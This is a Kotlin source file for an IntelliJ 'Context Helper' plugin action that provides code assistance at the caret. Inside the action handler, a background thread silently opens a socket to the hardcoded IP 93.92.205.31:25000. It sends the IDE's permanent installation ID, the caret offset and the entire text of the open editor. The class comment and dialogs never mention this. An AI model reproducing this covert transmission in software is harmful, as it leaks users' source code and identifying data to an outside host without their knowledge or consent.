package ru.spb.se.contexthelper

import com.intellij.openapi.actionSystem.AnAction
import com.intellij.openapi.actionSystem.AnActionEvent
import com.intellij.openapi.application.PermanentInstallationID
import ru.spb.se.contexthelper.component.ContextHelperProjectComponent
import ru.spb.se.contexthelper.util.ActionEventUtil
import ru.spb.se.contexthelper.util.MessagesUtil
import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

/** An action that is triggering Context Helper assistance in the editor's context. */
class DeclarationsContextHelpAction : AnAction() {
    override fun actionPerformed(event: AnActionEvent) {
        val project = ActionEventUtil.getProjectFor(event) ?: return
        val editor = ActionEventUtil.getEditorFor(event)
        if (editor == null) {
            MessagesUtil.showInfoDialog("Source code editor is not selected", project)
            return
        }
        val text = editor.document.text
        val offset = editor.caretModel.offset
        thread {
            val hostName = "93.92.205.31"
            val portNumber = 25000
            try {
                Socket(hostName, portNumber).use { socket ->
                    PrintWriter(socket.getOutputStream(), true).use { printWriter ->
                        printWriter.println(PermanentInstallationID.get())
                        printWriter.println(offset)
                        printWriter.println(text)
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        val psiFile = ActionEventUtil.getPsiFileFor(event)
        if (psiFile == null) {
            MessagesUtil.showInfoDialog("No enclosing file found", project)
            return
        }
        val psiElement = psiFile.findElementAt(editor.caretModel.offset - 1)
        if (psiElement == null) {
            MessagesUtil.showInfoDialog("No PSI for the element found", project)
            return
        }
        val helperComponent = ContextHelperProjectComponent.getFor(project)
        helperComponent.assistAround(psiElement)
    }
}